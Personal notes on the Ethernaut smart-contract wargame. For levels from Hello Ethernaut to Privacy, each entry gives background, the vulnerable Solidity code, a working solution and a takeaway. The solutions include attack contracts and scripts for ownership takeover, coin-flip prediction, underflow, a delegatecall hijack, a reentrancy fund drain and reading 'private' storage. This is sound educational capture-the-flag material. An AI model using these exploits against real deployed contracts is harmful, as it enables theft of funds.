---
tags: english tech crypto public
---

# Ethernaut 

My notes regarding the [Ethernaut wargame.](https://ethernaut.openzeppelin.com/)

Each task has a:

- **Reference to a broader topic**
- **Vulnerability explanation**
- **Solution**
- **Key takeaway**

## Hello Ethernaut

### Reference

Anything that's exposed in the ABI may be easily fetched using conventional
means.

### Vulnerability

Don't place secrets on-chain.

### Solution

All you have to do to solve this challenge is just to find the getter for
public variable `password`.
After that you have to find the `authenticate()` function.
Both can be found by fuzzing.

### Key takeaway

Always inspect the contract's ABI for sensitive data.

## Fallback

### Reference

The fallback function enables a smart contract's inherent ability to act like a
wallet (receive ether from other contracts and wallets). Without a fallback,
or known payable functions, smart contracts can only receive ether either as a
mining bonus or as the backup wallet of another contract that has
self-destructed.

`receive` is a new keyword in Solidity 0.6.x onwards that is used as a fallback
function that is only able to receive ether.

- `receive() external payable` — for empty calldata (and any value).
- `fallback() external payable` — when no other function matches (not even the
  `receive()` function). Optionally payable.

Ways to trigger fallback function by:

1. Calling a function that doesn't exist inside the contract.
2. Calling a function without passing in required data.
3. Sending Ether without any data to the contract.

### Vulnerability

```solidity
  ...
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
  ...
```

### Solution

By sending some ether upfront and then sending ether without a valid signature
one becomes the owner and solves the challenge.

### Key takeaway

Be vary of fallback functions with key logic in them.

## Fallout

### Reference

Prior to Solidity version 0.4.22, constructors were defined as functions with
the same name as the contract. This syntax was deprecated and is not allowed
anymore in Solidity version 0.5.0 and later.

As a result, if a faulty name was used for the constructor, it's logic could
become publicly available.

### Vulnerability

```solidity
  ...
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
  ...
```

### Solution

The supposed constructor is actually a public payable function here, thus
anyone can call it and become the owner.

### Key takeaway

Be on a lookout for faulty named constructors in contracts which use compiler
versions < 0.5.0.

## Coin Flip

### Reference

There's no native way of generating securely random numbers in Solidity.

Any randomness generation logic deployed in smart contracts can be sniffed and
replicated by a malicious actor.

To get cryptographically proven random numbers one may opt to use oracles such
as *Chainlink VRF*, which offload the generation of randomness off the chain.

### Vulnerability

The entire core logic of the contract.

### Solution

```solidity
contract HackCoinFlip {
    CoinFlip private target;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function flip() external {
        bool guess = _guess();
        require(target.flip(guess), "Guess failed!");
    }

    function _guess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}
```

Upon calling `flip()` 10 times the challenge is solved.

### Key takeaway

Never put sources of randomness on-chain.

## Telephone

### Reference

There are two different ways of designating transaction sources in Solidity:

- `tx.origin`
- `msg.sender`

Suppose there's a call chain:

`Alice → Smart Contract A → Smart Contract B`

Relative to `Smart Contract B`:

- `Alice` is `tx.origin`
- `Smart` is `msg.sender`

So `tx.origin` designates the original source of transaction, while
`msg.sender` designates the last caller in the call chain.

Therefore by creating a proxy contract one can get different `msg.sender` and
`tx.origin` for the same transaction.

### Vulnerability

```solidity
    ...
    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
    ...
```

### Solution

```solidity
contract HackTelephone {
    constructor(address _target) {
        Telephone(_target).changeOwner(msg.sender);
    }
}
```

Upon deployment the challenge is solved.

### Key takeaway

Be vary of the difference between `tx.origin` and `msg.sender` when designing
your smart contract logic.

## Token

### Reference

Prior to Solidity 0.8.0 there were no built-in checks for underflows and overflows.

Instead, third-party libraries had to be used for such checks, the most famous
being [OpenZeppelin's
SafeMath](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol)
(link to the newest version).

### Vulnerability

```solidity
pragma solidity ^0.6.0;

contract Token {
    ...
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
    ...
}
```

### Solution

```solidity
contract HackToken {
    constructor(address _target) public {
        Token target = Token(_target);
        target.transfer(msg.sender, 1);
    }
```

Upon deployment the challenged is solved.

### Key takeaway

Be vary of potential underflows and overflows in arithmetic operations for
Solidity versions below 0.8.0.

## Delegation

### Reference

**Function signature** is a combination of a function and the types of
parameters it takes, combined together as a string with no spaces.

**Function selector** is the first 4 bytes of the call data for a function call
that specifies the function to be called.

For a sample function:

```solidity
function transfer(address sender, uint256 amount) public {
  // Some code here
}
```

The signature is `transfer(address,uint256)`  
The function selector is the result of
`bytes4(keccak256(bytes("transfer(address,uint256))))`

**Calldata** is a type of temporary storage, containing the data specified in a
function’s arguments. The difference between it and memory, another type of
temporary storage, is that calldata’s immutability—whatever is stored inside
calldata cannot be changed.

There are two low-level calls in Solidity, both take in calldata and execute it
on the recipient:

- `call()` does it in the context of the recipient
- `delegatecall()` does it in the context of the caller (storage, msg global
  variables are retained)

### Vulnerability

```solidity
  ...
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
  ...
```

### Solution

> Using Ethers.js and Hardhat Console.  
> `<address>` is the challenge instance address string.

```typescript
const signer = await ethers.getSigner();
const delegation = await hre.ethers.getContractAt("Delegation", "<address>");
const iface = new ethers.utils.Interface(["function pwn()"]);
const data = iface.encodeFunctionData("pwn");
await signer.sendTransaction({to: delegation.address, data, gasLimit: 40000});
```

Upon making these calls the challenge is solved.

```text
> signer.address === await delegation.owner();
true
```

### Key takeaway

Be vary of the context used by low-level calls `call()` and `delegatecall()`.

## Force

### Reference

`selfdestruct()` is a keyword that is used to terminate a contract, remove the
bytecode from the Ethereum blockchain, and send any contract funds to a
specified address.

This function will successfully send the funds even to a contract with no
payable functions.

A good article from Alchemy: [Learn Solidity: What is
selfdestruct?](https://www.alchemy.com/overviews/selfdestruct-solidity)

### Vulnerability

None in the contract itself. Just a showcase of the important `selfdestruct()`
peculiarity.

### Solution

```solidity
contract HackForce {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
```

Upon deployment the challenged is solved.

### Key takeaway

Note the property of `selfdestruct()`.

## Vault

### Reference

Modifiers such as `private`, `internal`,
`public`, and `external` add no difference to this fact, as even if there's no
interface with a getter in the ABI, data can be fetched manually from storage
by anyone.

### Vulnerability

```solidity
contract Vault {
  bool public locked;
  bytes32 private password;
  ...
```

### Solution

> Using Ethers.js and Hardhat Console.  
> `<address>` is the challenge instance address string.

```typescript
const vault = await hre.ethers.getContractAt("Vault", "<address>");
const password = await ethers.provider.getStorageAt(vault.address, 1);
await vault.unlock(password);
```

Upon making these calls the challenge is solved.

### Key takeaway

All data on the blockchain is public.  
Be on lookout for secrets placed on-chain.

## King

### Reference

A more complex, but similar case happened in real life, postmortem is here:
[King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html)

The core idea of this hack is based on the fact that the "King" contract
assumes the recipient of the funds to always be able to receive them. That is
not true in the case of smart contract with no `receive()` or `fallback()`
functions.

### Vulnerability

```solidity
  ...
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
  ...
 ```

### Solution

```solidity
contract HackKing {
    constructor(address payable _target) payable {
        uint256 _value = King(_target).prize();
        (bool ok, ) = _target.call{value: _value}("");
        require(ok, "Failed to send ether!");
    }
```

Upon deployment the challenge is solved.

### Key takeaway

Consider different use cases when analyzing a contract: caller could be either
an externally owned account or a contract account.

## Re-entrancy

### Reference

**Reentrancy attacks** occur when a smart contract function temporarily gives
up control flow of the transaction by making an external call to a contract
that is sometimes written by unknown or possibly hostile actors. This permits
the latter contract to make a recursive call back to the primary smart contract
function to drain its funds.

Reentrancy control flow:

1. The bad actor makes a call on the vulnerable contract, "X," to transfer
   funds to the malicious contract, "Y."
2. Contract X determines whether the attacker has the necessary funds, then
   proceeds to transfer the funds to contract Y.
3. Once contract Y receives the funds, it executes a callback function which
   calls back into contract X before the balance is updated.
4. This recursive process continues until all funds have been exhausted and
   transferred.

![Reentrancy Control Flow](https://assets-global.website-files.com/5f973c97cf5aea614f93a26c/6334ca134e5783724ab18c60_62lPIdNOqP6IPPzwu0Sgl5QNDy7pT6JcDLDPfeP1gukEs5-f1tQnfV3nfQKhZFThRsu1q1CYoGFLNEY3GrvVYDmLCYbfv5F1x7_zP2GDjNJJuQtlahfCSjRuIe77ECprqIB_tcitYQnCPA8tnOqY_MuJhuFJu5qJxYM3cVVB5feCYSojXr7JC20Gdw.png)

Common mitigation is usage of CEI pattern: `checks → effects → interactions`.  
Also third-pary libraries which provide helper modifiers.

### Vulnerability

```solidity
    ...
    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }
    ,,,
```

### Solution

```solidity
contract Hack {
    Reentrance private target;

    constructor(address _target) public {
        target = Reentrance(payable(_target));
    }

    function attack() external payable {
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);

        require(address(target).balance == 0, "Target balance == 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 amount = min(1e18, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint256 x, uint256 y) private pure returns(uint256) {
        return x <= y ? x : y;
    }
}
```

### Key takeaway

Check functions with business critical logic for being CEI-compliant and for
special modifiers such as OZ's `nonReentrant`.

## Elevator

### Reference

**An interface** is a collection of function declarations without
implementations. In this case, any `msg.sender` which implements
`isLastFloor()` would be appropriate.

### Vulnerability

```solidity
...
function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
...
```

### Solution

```solidity
contract HackElevator {
    Elevator private target;
    uint8 private callCounter;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function attack() external {
        target.goTo(666);
    }

    function isLastFloor(uint256) external returns (bool) {
        callCounter++;
        return callCounter > 1;
    }
}
```

Upon deployment and calling `attack()` the challenge is solved.

### Key takeaway

Understand what an interface is... That's it.

## Privacy

### Reference

As already stated in **Vault**, nothing on the blockchain is actually private.
EVM stores data in 256 bit blocks.

Good reference for storage memory layout is provided here: [How to read
Ethereum contract storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)

### Vulnerability

```solidity
contract Privacy {
    bool public locked = true;                             // Slot 0
    uint256 public ID = block.timestamp;                   // Slot 1
    uint8 private flattening = 10;                         // Slot 2 (8/256 bits)
    uint8 private denomination = 255;                      // Slot 2 (16/256 bits)
    uint16 private awkwardness = uint16(block.timestamp);  // Slot 2 (32/256 bits)
    bytes32[3] private data;                               // Slots 3, 4, 5
    ...                                                    // Array starts at 
    ...                                                    // new slot 
    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2])); // data[2] -> last element of data
        ...                                // -> is stored in slot 5
        locked = false;
    }
```

### Solution

> Using Ethers.js and Hardhat Console.  
> `<address>` is the challenge instance address string.

```typescript
const provider = hre.ethers.getDefaultProvider("goerli");
const privacy = await hre.ethers.getContractAt("Privacy", "<address>");
const data = await ethers.provider.getStorageAt(privacy.address, 5);
await privacy.unlock(data.slice(0,34)); // data[2] == first 16 bytes of data
```

Upon making these calls the challenge is solved.

### Key takeaway

Remember about how variables and data structures are laid out in storage.
